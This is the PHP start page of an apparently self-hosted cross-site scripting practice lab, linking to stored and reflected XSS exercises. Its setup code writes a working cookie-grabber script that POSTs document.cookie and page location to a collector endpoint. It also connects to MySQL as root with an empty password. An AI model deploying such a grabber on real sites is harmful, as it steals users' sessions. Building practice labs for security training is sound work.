<?php
error_reporting(0);

if (!isset($_COOKIE['ID'])){
	$cookie_name = 'ID';
	$val = "XSS-LAB";
	$cookie_value = base64_encode($val);
	setcookie($cookie_name, $cookie_value,time() + (86400 * 365),'/');
}
?>
<html>
<head>
<title>Cross Site Scripting Lab</title>
</head>
<body>
<style>
body{
	background-color:#012F49;
	font-family:Lucida Sans Unicode;
}
input[type='submit'],input[type='button']{
	width:150px;
	height:35px;
	margin:5px;	
	font-family:lucida console;
}
#green{
	background-color:#0A8705;
	min-height:30px;	
	border-top:2px dashed black;
	border-right:2px dashed black;
	border-left:2px dashed black;
	border-top-left-radius:7px;
	border-top-right-radius:7px;
}
#white{
	background-color:white;
	min-height:30px;
	border-left:2px dashed black;
	border-right:2px dashed black;
	text-align:center;
	padding-top:4px;
}
#red{
	background-color:red;
	min-height:30px;
	border-bottom:2px dashed black;
	border-right:2px dashed black;
	border-left:2px dashed black;
	border-bottom-left-radius:7px;
	border-bottom-right-radius:7px;
}
#text{
	background-color:white;
	min-height:300px;
	margin-top:7px;
	border:2px dashed black;
	border-radius:5px;
	padding:25px;
	text-align:center;
	font-weight:bold;
}
table{
	margin-left:270px;;	
}
#td1{
	width:30px;	
}
#td2{
	width:360px;	
}
#td3{
	width:150px;	
}
a{
	color:#450001;	
	text-decoration:none;
}
a:activated{
	color:black;	
}
a:hover{
	color:black;	
}
</style>
</style>
<script>
if (!sessionStorage.getItem("is_reloaded")){ 
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";

  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
};
sessionStorage.setItem("is_reloaded", true);
</script>
<div id="all">
	<div id="green">
    
    </div>
    <div id="white">
    In The Name Of Allah
    </div>
    <div id="red">
    </div>
    <div id="text">
	<form action="" method="POST">
		<div id="type">
			~~ Cross Site Scripting ~~<br/><br/>
			The First Click On ' Configure ' So Click On Type Of Vulnerability To Continue ...
			<br>
			<br>
			<table align="center">
			<tr>
				<td id="td1">1- </td><td id="td2"><a href="Stored-Post">Persistent Cross Site Scripting [POST Method]</a></td>
				<td id="td3">~~> Stored</td>
			</tr>
			<tr>
				<td id="td1">2- </td><td id="td2"><a href="Stored-Get">Persistent Cross Site Scripting [GET  Method]</a></td>
				<td id="td3">~~> Stored</td>
			</tr>
			<tr>
				<td id="td1">3- </td><td id="td2"><a href="Reflected">Non Persistent Cross Site Scripting</a></td>
				<td id="td3">~~> Reflected</td>

			</tr>
			</table>
			<br>
			<center>
				<input type="submit" name="setup" value="Configure">
				<input type="submit" name="deletedb" value="Delete Database">
			</center>
			<br/>
			<font color="DarkGreen">Code By B14CK SPID3R</font><br/>
		</div>
	</form>
    </div>
</div>
<script type="text/javascript">
new TypingText(document.getElementById("type"), 30);
TypingText.runAll();
</script>
	<?php
		//create sender.js file
		$self_path = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
		$grabber_path = str_replace("index.php","Grabber/grabber.php",$self_path);
		$sender_file = "
			  var HttPRequest = false; 
			  try { 
				  HttPRequest = new ActiveXObject(\"MSXML2.XMLHTTP\"); 
			  } catch (exception1) { 
				  try { 
					  HttPRequest = new ActiveXObject(\"Microsoft.XMLHTTP\"); 
				  } catch (exception2) { 
					  HttPRequest = false; 
				  } 
			  } 
			  if (!HttPRequest && window.XMLHttpRequest) { 
				HttPRequest = new XMLHttpRequest(); 
			  } 
		 
			   function getData() {
					
				  if (!HttPRequest) {
					 alert('Cannot create XMLHTTP instance');
					 return false;
				  }
					var xlocation=window.location.host;
					var xpathname=window.location.pathname;
					var xhref=window.location.href;
					var xcookie=document.cookie;
					var url =  \"$grabber_path\";
					var pmeters='xlocation='+xlocation+'&xpathname='+xpathname+'&xhref='+xhref+'&xcookie='+xcookie;
					HttPRequest.open('POST',url,true);
			 
					HttPRequest.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");
					HttPRequest.setRequestHeader(\"Content-length\", pmeters.length);
					HttPRequest.setRequestHeader(\"Connection\", \"close\");
					HttPRequest.send(pmeters);
					HttPRequest.onreadystatechange = function(){

					}
				 }
		getData();
		";
		
		$fo = fopen("Grabber/sender.js","w");
		$fw = fwrite($fo,$sender_file);
		$fc = fclose($fo);
		
		//configure database
		if (isset($_POST['setup'])){
			$install = include 'install.php';
				if ($install && $fw && $fc){
					unlink('install.php');
					echo "<script>alert('Database And Sender.js Configured Successfully! install.php Removed ...')</script>";
				}else{
					echo "<script>alert('install.php Not Found!')</script>";
				}
			
		}
		//delete db
		if (isset($_POST['deletedb'])){
			//define variables;
			$host = "localhost";
			$user = "root";
			$pass = "";
				try{
					//connect to database & set attribute;
					$connect = new PDO("mysql:host=$host",$user,$pass);
					$connect->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
					//delete database;
					$sql = "DROP DATABASE xss";
					$stmt = $connect->prepare($sql);
					$stmt->execute();
					echo "<script>alert('Database Deleted Successfully! BY3 ...')</script>";
					
				}catch(PDOException $e){
					//check database exist or not;
					if (strpos($e,"SQLSTATE[HY000]")){
						echo "<script>alert('Database Not Found!')</script>";
					}else{
						echo "Error: ".$e->getMessage();
					}
				}
		}
	?>
</body>
</html>
